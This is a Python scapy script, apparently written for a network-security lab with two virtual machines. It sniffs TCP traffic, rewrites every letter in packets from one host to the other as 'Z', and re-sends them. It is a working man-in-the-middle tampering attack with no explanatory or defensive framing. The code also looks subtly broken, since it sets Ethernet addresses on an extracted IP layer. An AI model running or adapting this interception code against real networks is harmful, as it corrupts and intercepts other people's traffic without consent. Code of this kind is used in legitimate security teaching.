# @author Johann Vargas
#!/usr/bin/env python3

# Import scapy library's all submodule
from scapy.all import *

# Import necessary modules
import re

# Get IP address and Mac-address of VM A from user 
VM_A_IP = input("Enter IP address of VM A: ")
VM_A_MAC = input("Enter MAC address of VM A: ")

# Get IP address and Mac-address of VM B from user 
VM_B_IP = input("Enter IP address of VM B: ")
VM_B_MAC = input("Enter MAC address of VM B: ")

# Function to spoof packet
def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
        # Store payload read in by packet
        real = (pkt[TCP].payload.load)

        # Set data to payload decoded
        data = real.decode()

        # Create replacement string
        stri = re.sub(r'[a-zA-Z]',r'Z',data)

        # Create new packet with details from old packet
        newpkt = pkt[IP]

        # Set source and destination addresses
        newpkt.src = VM_A_IP
        newpkt.dst = VM_B_IP

        # Delete checksums corresponding to TCP and IP portions
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        # Include payload (string) in new packet
        newpkt = newpkt/stri

        # Set source and destination mac addresses
        newpkt[Ether].src = VM_A_MAC
        newpkt[Ether].dst = VM_B_MAC

        # Print information
        print("Data transformed from: "+str(real)+" to: "+ stri)

        # Send new packet
        sendp(newpkt, verbose = False)

    # Condition for packets from destination to source, with no payload
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        newpkt = pkt[IP]
        newpkt.src = VM_B_IP
        newpkt.dst = VM_A_IP
        newpkt[Ether].src = VM_B_MAC
        newpkt[Ether].dst = VM_A_MAC
        sendp(newpkt, verbose = False)

# Sniff packets on filter TCP
pkt = sniff(filter='tcp', prn=spoof_pkt)


